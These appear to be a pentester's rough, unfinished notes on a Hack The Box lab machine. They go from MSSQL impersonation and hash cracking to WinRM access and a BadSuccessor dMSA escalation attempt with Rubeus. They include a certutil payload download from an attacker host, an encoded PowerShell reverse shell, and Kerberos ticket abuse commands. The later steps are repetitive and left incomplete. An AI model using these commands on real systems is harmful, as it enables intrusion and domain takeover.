# Scope

**Machine**: 10.129.21.118
**Credentials**: `kevin / iNa2we6haRj2gaw!`

# Information Gathering

## port discovery
Let's start with an nmap scan:

`sudo nmap -sS -p- 10.129.21.118`
`sudo nmap -sU -p- 10.129.21.118`

```
PORT      STATE         SERVICE
80/tcp    open          http
1433/tcp  open          ms-sql-s
5985/tcp  open          wsman
53/udp    open          domain
```
# Enumeration

## port enumeration

Let's take it a step further with nmap:

`sudo nmap -sS -sU -sV -sC -O --script vuln -p T:80,1433,5985,U:53 10.129.21.118 -oN eighteen-port-enumeration.txt`

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=eighteen.htb
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://eighteen.htb:80/register
|     Form id: full_name
|     Form action: /register
|
|     Path: http://eighteen.htb:80/login
|     Form id: username
|_    Form action: /login
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000
|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
53/udp   open  domain   Simple DNS Plus
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 943.32 seconds
```

We found some important info:
- The machines OS: Windows Server 2012-22

## http

`searchsploit IIS httpd 10.0`
no exploits found.
## web enumeration

Before interacting with the web server we need to add it to our `/etc/hosts` file to make it reachable.

![[Pasted image 20260209131150.png]]
Now when we connect via the browser, we see:

![[Pasted image 20260209131532.png]]

### manual enumeration

After walking through the website we found to forms, one to register a new account another to login.

![[Pasted image 20260209132615.png]]
![[Pasted image 20260209132645.png]]

Now let's use the credentials we were given an attempt to login:

![[Pasted image 20260209135358.png]]
![[Pasted image 20260209135752.png]]

The credentials didn't work.

Let's create a user and investigate the application internally:

![[Pasted image 20260209135952.png]]

Now we can investigate the app and check for flaws or vulnerabilities.

![[Pasted image 20260209140208.png]]

Attempting to access the admin panel we get the following access denied message:
![[Pasted image 20260209140336.png]] 

### subdomain enumeration

`gobuster dns --domain eighteen.htb --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

```
...
...
Progress: 4985 / 4989 (99.92%)[ERROR] error on word vo: lookup vo.eighteen.htb.: i/o timeout
[ERROR] error on word www.msk: lookup www.msk.eighteen.htb.: i/o timeout
[ERROR] error on word pc2: lookup pc2.eighteen.htb.: i/o timeout
Progress: 4988 / 4989 (99.98%)[ERROR] error on word schools: lookup schools.eighteen.htb.: i/o timeout
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```

No subdomains were found.
### directory enumeration
`gobuster dir --url http://eighteen.htb --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt`

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://eighteen.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin                (Status: 302) [Size: 199] [--> /login]
dashboard            (Status: 302) [Size: 199] [--> /login]
features             (Status: 200) [Size: 2822]
login                (Status: 200) [Size: 1961]
logout               (Status: 302) [Size: 189] [--> /]
register             (Status: 200) [Size: 2421]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

## wsman

We can use try evil-winrm to gain a shell

`evil-winrm --ip 10.129.21.177 --user kevin --password 'iNa2we6haRj2gaw!'`

![[Pasted image 20260210082504.png]]

We gain initial access! But before you get your hopes up it doesn't work! :/

## ms-sql

Let's interact with the `mssql` db

`sqlcmd -S 10.129.21.161 -U kevin -P 'iNa2we6haRj2gaw!'`

![[Pasted image 20260209175021.png]]

We are able to access the db server.

```
netexec mssql -u kevin -p iNa2we6haRj2gaw! --port 1433 --local-auth 10.129.22.29 --rid-brute
```

![[Pasted image 20260211102505.png]]

Using `--rid` were able to enumerate users on the windows machine. we can use this usernames later to attempt to bruteforce creds and gain access with `wsman`

```
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
appdev
sa
```

### enumerating the database

Let's enumerate the database:

---
Here are some useful MSSQL commands:
db version
	```
	SELECT @@VERSION;
	GO
	```
current user:
	```
	SELECT
	SYSTEM_USER   AS login,
	 USER_NAME()   AS db_user;
	GO
	```
users you can impersonate:
	```
	SELECT
	  sp.name       AS you_can_impersonate,
	  sp.type_desc  AS principal_type
	FROM sys.server_permissions p
	JOIN sys.server_principals sp
	  ON p.grantor_principal_id = sp.principal_id
	WHERE p.permission_name = 'IMPERSONATE'
	  AND p.grantee_principal_id = SUSER_ID();
	GO
	```
list databases
	```
	SELECT name FROM sys.databases;
	```
select/enter database
	```
	USE <database_name>;
	```
list schema
	```
	SELECT name FROM sys.schemas;
	```
list tables
	```
	SELECT name FROM sys.tables;
	```
dump table values
	```
	SELECT * FROM dbo.<table_name>;
	or this one (lists only the first 100 values)
	SELECT TOP 100 * FROM dbo.<table_name>;
	```
dump table values into file
	```
	sqlcmd -S <host> -U <user> -P '<pass>' -d <database> -Q "SELECT * FROM dbo.table_name" -o table_dump.txt
	```
---

We can also use `impacket-mssqlclient` to make enumerating and RCE much easier:

`impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.22.29`

![[Pasted image 20260210111357.png]]

![[Pasted image 20260210111552.png]]

We quickly find out that there are three db-server users:
- sa
- appdev
- kevin
and that we can impersonate appdev.

After impersonating `appdev` we are able to access the `financial_planner` database:

![[Pasted image 20260210114004.png]]

We found the admin user and the password hash:
`pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`

Also we aren't able to execute `xp_cmdshell` so this password hash seems to be our best bet.

### attempting to crack the hash

#### identifying the hash
the `pbkdf2:sha256` at the beginning of the the hash helps use ID and narrow it down

`hashcat -hh | grep -i sha256 | grep -i pbkdf2`

```
10900 | PBKDF2-HMAC-SHA256                                     | Generic KDF
12800 | MS-AzureSync PBKDF2-HMAC-SHA256                        | Operating System
33700 | Microsoft Online Account (PBKDF2-HMAC-SHA256 + AES256) | Operating System
9200  | Cisco-IOS $8$ (PBKDF2-SHA256)                          | Operating System
33900 | Citrix NetScaler (PBKDF2-HMAC-SHA256)                  | Operating System
10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                | FTP, HTTP, SMTP, LDAP Server
32060 | NetIQ SSPR (PBKDF2WithHmacSHA256)                      | Enterprise Application Software (EAS)
27500 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)          | Full-Disk Encryption (FDE)
27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)          | Full-Disk Encryption (FDE)
10000 | Django (PBKDF2-SHA256)                                 | Framework
20300 | Python passlib pbkdf2-sha256                           | Framework
24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)    | Private Key
16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256           | Cryptocurrency Wallet
15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                    | Cryptocurrency Wallet
```

#### cracking it 

the only two that responded that are strictly pbkdf2 and sha256 without including hmac are django,cisco and python passlib. So let's attempt these two first, then we will try the other ones.

we can view how these hash types should be formatted in `hashcat` using this resource at the hashcat website:  [hash examples](https://hashcat.net/wiki/doku.php?id=example_hashes)

Here are the examples that match our needs:

| hash id | hash name      | value                                                                                     |
| ------- | -------------- | ----------------------------------------------------------------------------------------- |
| 9200    | Cisco IOS      | `$8$TnGX/fE4KGHOVU$pEhnEvxrvaynpi8j4f.EMHr6M.FzU8xnZnBr/tJdFWk`                           |
| 10000   | Django         | `pbkdf2_sha256$20000$H0dPx8NeajVu$GiC4k5kqbbR9qWBlsRgDywNqC2vd9kqfk7zdorEnNas=`           |
| 20300   | Python passlib | `$pbkdf2-sha256$29000$x9h7j/Ge8x6DMEao1VqrdQ$kra3R1wEnY8mPdDWOpTqOTINaAmZvRMcYd8u5OBQP9A` |

Cisco IOS in this case doesn't make sense since we know that machine's OS is Windows Server 2016. Which leaves us only Django and Python hashes.

Observe how we need to take the password hash unhex-it and base64 encode it 

`echo "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133" | xxd -r -p | base64`

`BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=`

Now we can format the hash in way hashcat understands:

Django:
```hash
pbkdf2_sha256$600000$AMtzteQIG7yAbZIa$BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```
Python passlib:
```hash
$pbkdf2-sha256$600000$AMtzteQIG7yAbZIa$BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

`hashcat -m 10000 hash rockyou.txt`
`hashcat -m 20300 hash rockyou.txt`

We were able to crack it with the Django hash format!

![[Pasted image 20260212090946.png]]

the admin password is `iloveyou1`

## web access to the admin panel

we are allowed access to the admin panel, but it doesn't lead anywhere, which is a bit of a rabbit-hole and disappointing. but, going down rabbit-holes is an important part of hacking. That why you should always quickly attempt all attack routes before committing hours into a single attack vector.

When searching for an initial foothold your search needs to be as wide as possible.
## wsman again!

`netexec winrm 10.129.2.12 -u ./users.txt  -p iloveyou1`

![[Pasted image 20260212094118.png]]

We found credentials of a local admin: `[+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)`

Perfect! Now we can use access the machine with evil-winrm.


# Exploitation

## gaining initial access

With the working credentials we found we can access the machine via winrm we can use `evil-winrm` to do so.

`evil-winrm -i 10.129.2.12 -u adam.scott -p iloveyou1`

![[Pasted image 20260212094501.png]]

After a quick search we found the user.txt in adam.scott's desktop directory/
# Post Exploitation

## information gathering

1. current user: `whoami`
	`eighteen\adam.scott`
2. user directories: `dir C:\Users`
	`adam.scott`
	`Administrator`
	`mssqlsvc`
3. list all users: `Get-LocalUsers`
	`Administrator`
	`mssqlsvc`
	`jamie.dunn`
	`jane.smith`
	`alice.jones`
	`adam.scott`
	`bob.brown`
	`carol.white`
	`dave.green`
4. current user groups: `whoami /group`
	`NT AUTHORITY\NTLM Authentication`
	`EIGHTEEN\IT`
	`NT AUTHORITY\This Organization`
	`NT AUTHORITY\Authenticated Users`
	`NT AUTHORITY\NETWORK`
5.  current user privileges: `whoami /priv`
	`SeMachineAccountPrivilege     Add workstations to domain     Enabled`
	`SeChangeNotifyPrivilege       Bypass traverse checking       Enabled`
	`SeIncreaseWorkingSetPrivilege Increase a process working set Enabled`

### using winpeas:

to get colors use the following command:
`REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

we can edit the tasks folder
and I suspect that the mssqlsvc user is the key 

interesting paths
`C:\Program Files\Python312\Scripts`
`C:\WINDOWS\System32\OpenSSH\`
`C:\Program Files\Microsoft SQL Server\`
`C:\Users\adam.scott\AppData\Local\Microsoft\WindowsApps`

alot of named pipes for SQL!

there is also a `mssqlsvc` user

Path with spaces 
`C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER`
`C:\Program Files\VMware\VMware Tools\vmtoolsd.exe`

Installed apps:
```
C:\Program Files\Common Files
C:\Program Files\desktop.ini
C:\Program Files\Internet Explorer
C:\Program Files\Microsoft
C:\Program Files\Microsoft SQL Server
C:\Program Files\Microsoft Visual Studio 10.0
C:\Program Files\Microsoft.NET
C:\Program Files\ModifiableWindowsApps
C:\Program Files\Python312
C:\Program Files\Reference Assemblies
C:\Program Files\Uninstall Information
C:\Program Files\VMware
C:\Program Files\Windows Defender
C:\Program Files\Windows Defender Advanced Threat Protection
C:\Program Files\WindowsApps
C:\Program Files\WindowsPowerShell
```

AutoRun apps:

`C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)`

Folder with Permissions:
```
Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
    
Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
```

Open Port:
`TCP 4680 sqlservr`


### sharphound:

Since we haven't found anything good yet let's pivot to AD, let's start collecting information using sharphound:

On your machine, start a python simple python server:
`python3 -m http.server 80`
On the victims machine:
`certutil -urlcache -f http://10.10.14.255/sharphound.exe sharphound.exe`

run the sharphound executable:
`./sharphound.exe`

this generates the following files:

```
20260221133514_BloodHound.zip
MGE1ZTIxYmUtZjVmMS00YzI1LWFjMzktZDdlNDBkZGFhYmQw.bin
```

we can download these files by creating an SMB server, but in the case of evil-winrm we can use the built-in download function:

![[Pasted image 20260221094212.png]]

Now we can upload these files to BloodHound to view the AD info and discover attack routes.

![[Pasted image 20260224150926.png]]

After some investigating of the Service Account vulnerabilities I found a recent AD Privilege Escalation attack called Bad Successor.

`.\Get-BadSuccessorOUPermissions.ps1`
![[Pasted image 20260302204616.png]]

`./SharpSuccessor.exe add /impersonate:Administrator /path:"ou=Staff,dc=eighteen,dc=htb" /account:adam.scott /name:evil_dMSA`
![[Pasted image 20260302204722.png]]

`./Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/EIGHTEEN.HTB /targetuser:evil_dMSA$ /ticket:adam.kirbi /dc:DC01.eighteen.htb /outfile:dmsa.kirbi /ptt /nowrap`
![[Pasted image 20260305115518.png]]

Now we can use the previous key which in this case is the Administrator keys:

![[Pasted image 20260305115733.png]]



```
New-ADServiceAccount -Name "BS_dMSA" -DNSHostName "blahhashd.com" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "adam.scott" -path "OU=Staff,DC=eighteen,DC=htb"
```

`$dMSA = [ADSI]"LDAP://CN=BS_dMSA,OU=Staff,DC=eighteen,DC=htb"`

`$dMSA.Put("msDS-DelegatedMSAState", 2)`

```
powershell.exe -nop -enc -w hidden JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMgA3ACcALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```




```
.\Rubeus-Latest.exe asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.htb /nowrap /ptt /enctype:AES256
```

```
Rubeus.exe asktgs /dmsa /opsec /service:KRBTGT_SPN /targetuser:DMSA_ACCOUNT$ </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER_Win2025] [/outfile:FILENAME] [/ptt] [/nowrap] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]
```

```
.\Rubeus-Latest.exe asktgs /dmsa /opsec /targetuser:bad_dMSA$ /service:KRBTGT_SPN /ptt /nowrap /ticket:<base64>
```

```
doIFpjCCBaKgAwIBBaEDAgEWooIEqTCCBKVhggShMIIEnaADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZWlnaHRlZW4uaHRio4IEYTCCBF2gAwIBEqEDAgECooIETwSCBEtLPO04ZzUiWTbpMZJj28XyB6hxdbDIjSSzPOpWPzPsTZ8Md3dPAQ7dYfBHKJ5xwp2649iP3NjzHmwLur/DbjNafQf0GnLsCzWJdVs5GbBTx8fR0WvEXaOmWCmgQSdTQSPRXQbEJFRb4eXosuplLlKi3x7Q4ltcFcSYtlVzxKt9QxnjEfkMbyokyyN9FSSXDNA0Gai+yl5UNiMWjz09kNMTpCKwGvd0skRL0eUUxgTo8G2yx9VIOuuUiaWpqsmKD0TS33toDxQyFlW/EdJhrCFn1ts6TbA38VCVuF3KOg3XocJPrT9e3R9fZBb5XBlJhvIr5mB7+TDTobOclM5pgnsRbQqmQfcgazfBdCl590J9o+iojV9f4szn0vh8VAHOfqqU8uRLNbIHXq9gAieCIEGwPMfgC2+aFIMUlN6G7M9nvl6yRj86ipRprywl9BX4UyLufmdFEaYjqddw/3jTRWndhxJty9LsNuttHl9F0moaqVBcQOdb/Kz1kTn69GX5K/xrW81l6ehnllHZ3Ip6ELIldmWDHv601KodebpL0Uu/5uPncOJvQPM7LXnde51IvKqLP8qAZ34loLBwzqOjhqs6dMFlcqBR5KRuW9zGe1XPNnOqSLI6kFCaHqC+elR+w9KbkTmXaWps6xkFPhJCtJ3BmJR7X59vnXmiOs+99WMpm1pFdyiE/tRBcThYQzapwwz9Hk0VdfILsUQ7tR1hgPdRmn3l/pKvO6+2cOIis+JUnkPBbQfSRbdgDO19WlKKfMJk3JxejoxSvLF3qu+V9D0GY5n3Rh8bkY2XMPnfcsZXB9mdkmXOhhjWoZj55FajWUKYIkbrIXj7GOQhn8mjL5UVSof0SgSufFQUwvhwy4Nbm8GGsj+Cf81zII4mlDubRR1ly5nFHxlHdRs2YI9UZHrjO3vYCNLyjpSN+OBA8kbChytew9431obLA4Crh1/WRZ8lMIPD4/P7xYg8K0VPD/qIvoul7pAlTzapMzrZS0ZzO2UyIG7IzG11tjarJ5Xoe7gzRpxu6LNRAsi4jZSEJagXs9ek8Mv53K/lxcjAnjmLAyeAXjmPEcMAMs4VnuxPI4pxYnYDml/fjm5kHcWwUg1zNFp3ggT6TLJN/2mIPeKYsK2sF48wRnguFgMdDnXfDT3k9aGwzWpzKevcb3+/GuUQRduF/UJ2o0ZK5yMin+8r8UcT0809jG4/dF/oRyweCO6FO4fuoy3ddEzIsPD/sYAqJQn6y1oBz7vFwvWYaaXZBkQWKofmBeaQO3RUMuWjXgX5H+SMoNjVZw3zJuYZP3lHorMpyHlZXXoF1GeeM7bflFmsTD2Zr9SSCOG1K6eWkQlKJUW2MWHiGo2sdZRonSGg0qWWotbXUbgPSc+M5GzBZQkJM2mSagevDDKYt9KBBaPl+qPgyw7ogjQtX7qgGr+68XMZ8wTGmK+4M27x4+yw2FssMTMdAA3y9FS6o4HoMIHloAMCAQCigd0Egdp9gdcwgdSggdEwgc4wgcugKzApoAMCARKhIgQgQ6pYF+5RMkEQSllBv7Kaem4REKcYs6MOhApu/sc6IM2hDhsMRUlHSFRFRU4uSFRCohcwFaADAgEBoQ4wDBsKYWRhbS5zY290dKMHAwUAQOEAAKURGA8yMDI2MDMwNDIyMzQwNVqmERgPMjAyNjAzMDUwODM0MDVapxEYDzIwMjYwMzExMjIzNDA1WqgOGwxFSUdIVEVFTi5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGVpZ2h0ZWVuLmh0Yg==
```


```
.\Rubeus.exe asktgs /user:bad_dMSA$ /service:cifs/DC01.eighteen.htb /opsec /dmsa /nowrap /ptt /ticket:
```


```
Rubeus.exe asktgs /dmsa /opsec /service:KRBTGT_SPN /targetuser:DMSA_ACCOUNT$ </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER_Win2025] [/outfile:FILENAME] [/ptt] [/nowrap] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]
```






krbtgt/EIGHTEEN.HTB

1. Create dMSA
2. Make it inherit from any user (Domain Admin)
3. Set the dMSA migration state to completed
4. Grab a TGT for the dMSA
5. Create a service and configure it to be run by the dMSA account



```
.\Get-BadSuccessorOUPermissions.ps1
```

```
./SharpSuccessor.exe add /impersonate:Administrator /path:"ou=Staff,dc=eighteen,dc=htb" /account:adam.scott /name:evil_dMSA
```

```
.\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /enctype:aes256 /opsec /nowrap /ptt /outfile:adam.scott.kirbi
```

```
.\Rubeus.exe asktgs /targetuser:evil_dMSA$ /service:krbtgt/EIGHTEEN.HTB /dmsa /opsec /nowrap /ptt /ticket:adam.scott.kirbi /outfile:dmsa.kirbi
```

`net group "domain admins" /add adam.scott /domain`

---
### Actual Bad Successor Exploitation:

1. Discover Vulnerable OU's

```
./Get-BadSuccessorOUPermissions.ps1
```

```
Identity    OUs
--------    ---
EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
```

2. Let's create a malicious dMSA
```
./SharpSuccessor.exe add /impersonate:Administrator /path:"ou=Staff,dc=eighteen,dc=htb" /account:adam.scott /name:evil_dMSA
```

3. Let's generate a tgt for adam.scott 

```
./Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /enctype:aes256 /domain:eighteen.htb /ptt /nowrap /outfile:adam.kirbi
```

4. Create and add dmsa tgs to our current session

```
.\Rubeus.exe asktgs /targetuser:evil_dMSA$ /service:krbtgt/EIGHTEEN.HTB /dmsa /opsec /enctype:aes256 /nowrap /ptt /ticket:adam.kirbi /outfile:dmsa.kirbi
```

```
.\Rubeus.exe asktgs /targetuser:evil_dMSA$ /service:ldap/DC01.eighteen.htb /dmsa /opsec /enctype:aes256 /nowrap /ptt /ticket:adam.kirbi /outfile:dmsa.kirbi
```

---

LAST TRY:

```
powershell -ep bypass -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMgA3ACcALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

`./SharpSuccessor.exe add /impersonate:Administrator /path:"ou=Staff,dc=eighteen,dc=htb" /account:adam.scott /name:evil_dMSA`

`Get-ADServiceAccount evil_dMSA -Properties *`

`./Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /opsec /enctype:aes256 /domain:eighteen.htb /ptt /nowrap /outfile:adam.kirbi`

`.\Rubeus.exe asktgs /targetuser:evil_dMSA$ /service:krbtgt/EIGHTEEN.HTB /opsec /dmsa /nowrap /ptt /ticket:adam.kirbi /outfile:dmsa.kirbi`

`.\Rubeus.exe asktgs /user:evil_dMSA$ /service:ldap/DC01 /opsec /enctype:aes256 /dmsa /nowrap /ptt /ticket:dmsa.kirbi`

---


**I'm going insane:**

```
./SharpSuccessor.exe add /impersonate:Administrator /path:"ou=Staff,dc=eighteen,dc=htb" /account:adam.scott /name:evil_dMSA
```

grab adam.scott TGT:
```
./Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /opsec /enctype:aes256 /domain:eighteen.htb /ptt /nowrap /outfile:adam.kirbi
```

grab dmsa TGS:
```
./Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/EIGHTEEN.HTB /targetuser:evil_dMSA$ /ticket:adam.kirbi /dc:DC01.eighteen.htb /outfile:dmsa.kirbi /ptt /nowrap
```


```
.\Rubeus.exe asktgs /user:evil_dMSA$ /service:ldap/DC01 /opsec /enctype:aes256 /dmsa /nowrap /ptt /ticket:dmsa.kirbi
```